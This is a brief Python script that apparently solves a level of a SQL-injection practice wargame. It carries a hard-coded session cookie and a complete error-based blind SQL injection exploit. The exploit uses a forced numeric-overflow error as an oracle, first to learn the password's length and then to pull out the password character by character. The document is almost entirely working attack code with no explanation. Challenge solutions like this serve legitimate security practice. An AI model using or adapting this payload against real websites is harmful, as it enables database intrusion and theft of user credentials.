import requests
from string import digits,ascii_lowercase

session = requests.Session()
cookies = {"PHPSESSID": "sf39lsdmack4t4uu2ekha9vd5g"}

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(length(pw)={},power(2,99999999999),0);--+"
for i in range(100):
    r = requests.get(url.format(i), cookies=cookies)
    print(i,end='\r')
    if('DOUBLE value is out of range in' in r.text):
        l=i
        break
print("Length :",l) 
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or if(pw like '{}%',power(2,99999999999),0);--+"
pw = ""
for j in range(l):
    for i in digits+ascii_lowercase:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('DOUBLE value is out of range in' in r.text and i not in "#+%&"):
            pw += i
            print("Password : {}".format(pw),end='\r')
            break
print("Password :", pw)
